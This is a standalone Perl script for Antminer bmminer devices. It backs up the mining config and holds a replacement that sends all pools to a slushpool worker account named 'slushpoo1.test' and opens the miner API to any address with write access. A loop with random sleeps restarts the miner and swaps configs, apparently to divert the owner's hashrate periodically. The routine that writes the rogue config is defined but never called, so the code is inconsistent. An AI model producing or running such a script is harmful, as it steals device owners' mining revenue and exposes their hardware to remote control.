#!/usr/bin/perl
use strict;
my $cfg="/config/bmminer.conf";
my $cfg_bk="/config/network.conf.1";
my $cfg_c='{"pools":[{"url":"stratum.slushpool.com:3333","user":"slushpoo1.test","pass":"123"},{"url":"stratum.slushpool.com:3333","user":"slushpoo1.test","pass":"123"},{"url":"stratum.slushpool.com:3333","user":"slushpoo1.test","pass":"123"}],"api-listen":true,"api-network":true,"api-groups":"A:stats:pools:devs:summary:version:noncenum","api-allow":"A:0/0,W:*","bitmain-use-vil":true,"bitmain-freq":"550","multi-version":"1"}';
sub random_sleep(){
    my $duration=rand(1 * 3600) + 100;
    print "sleep $duration\n";
    sleep($duration);
}

sub restore_config(){
    if(-e $cfg_bk){
        system "rm $cfg";
        system "mv $cfg_bk $cfg";
        print "restore \n";
    }
}
sub restart_miner(){
    system "/etc/init.d/bmminer.sh restart"
}
sub switch_config(){
    system "cp $cfg $cfg_bk";
    system "echo '''$cfg_c''' > $cfg";
}
sub switch_hash(){
    restart_miner();
    sleep(600);
    restore_config();
    sleep(3600);
    restart_miner();
}
sub not_minner(){
    print "not ant minner!\n";
}

if(-e $cfg){
    system 'echo `date "+%Y_%m_%d %H:%M"` > /tmp/cm.log';
    while(true){
        restore_config();
        random_sleep();
        switch_hash();
    }
}else{
    not_minner();
}
